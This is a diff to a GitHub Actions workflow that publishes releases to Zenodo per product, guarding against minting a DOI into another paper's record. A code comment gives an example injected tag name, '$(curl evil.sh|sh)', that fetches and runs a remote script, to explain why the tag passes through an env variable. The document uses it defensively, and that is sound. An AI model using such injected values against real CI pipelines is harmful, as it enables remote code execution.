@@ -1,8 +1,29 @@
+# Zenodo deposit -- the only irrevocable step in the release.
+#
+# This deposited EVERY release into deposition 19456875, which is the record
+# "GoldenFloat: phi-Optimal Floating-Point Formats for Ternary Computing".
+# Meanwhile .zenodo.json in this repository describes "T27: TRI-27 -- Spec-First
+# Language for Ternary Computing". So a t27c release would have attached the
+# compiler, as a new version, to the DOI of a different paper. A DOI cannot be
+# withdrawn.
+#
+# The deposition is now looked up PER PRODUCT from a repository variable. When
+# the variable for the product being released is unset, this SKIPS and says so:
+# a DOI can be minted later, and a DOI minted into the wrong record cannot be
+# unminted.
+#
+# To enable for t27c:         gh variable set ZENODO_DEPOSITION_T27C --body <id>
+# To enable for golden-float: gh variable set ZENODO_DEPOSITION_GOLDEN_FLOAT --body 19456875
+
 name: Publish to Zenodo on Release
 
 on:
   release:
     types: [published]
+
+concurrency:
+  group: zenodo-${{ github.event.release.tag_name }}
+  cancel-in-progress: false
 
 jobs:
   zenodo:
@@ -10,12 +31,41 @@ jobs:
     steps:
       - uses: actions/checkout@v6
 
+      - name: Which record does this tag belong in
+        id: which
+        env:
+          TAG: ${{ github.event.release.tag_name }}
+        run: |
+          set -euo pipefail
+          # A tag name is attacker-controlled text. Interpolated straight into
+          # `run:` it is SHELL: a tag called $(curl evil.sh|sh) executes. It
+          # comes through env, where the shell sees a variable and never a
+          # substitution. The Untrusted Input gate caught this on the commit
+          # that introduced it.
+          case "$TAG" in
+            t27c-v*)                       DEP="${{ vars.ZENODO_DEPOSITION_T27C }}" ;;
+            golden-float-v*|v*)            DEP="${{ vars.ZENODO_DEPOSITION_GOLDEN_FLOAT }}" ;;
+            *)                             DEP="" ;;
+          esac
+          if [ -z "$DEP" ]; then
+            echo "SKIPPED: no Zenodo deposition is configured for '$TAG'."
+            echo "  Nothing was deposited. This is deliberate: depositing a release"
+            echo "  into another work's record mints a permanent DOI that names the"
+            echo "  wrong thing, and 19456875 is the GoldenFloat paper's record."
+            echo "  Set the variable for this product and re-run to mint one."
+            echo "deposit=no" >> "$GITHUB_OUTPUT"
+          else
+            echo "deposit=yes" >> "$GITHUB_OUTPUT"
+            echo "deposition=$DEP" >> "$GITHUB_OUTPUT"
+          fi
+
       - name: Upload to Zenodo
+        if: steps.which.outputs.deposit == 'yes'
         uses: megasanjay/upload-to-zenodo@v2.0.1
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
           zenodo_token: ${{ secrets.ZENODO_TOKEN }}
-          zenodo_deposition_id: "19456875"
+          zenodo_deposition_id: ${{ steps.which.outputs.deposition }}
           zenodo_publish: true
           zenodo_sandbox: false
           update_metadata_files: true
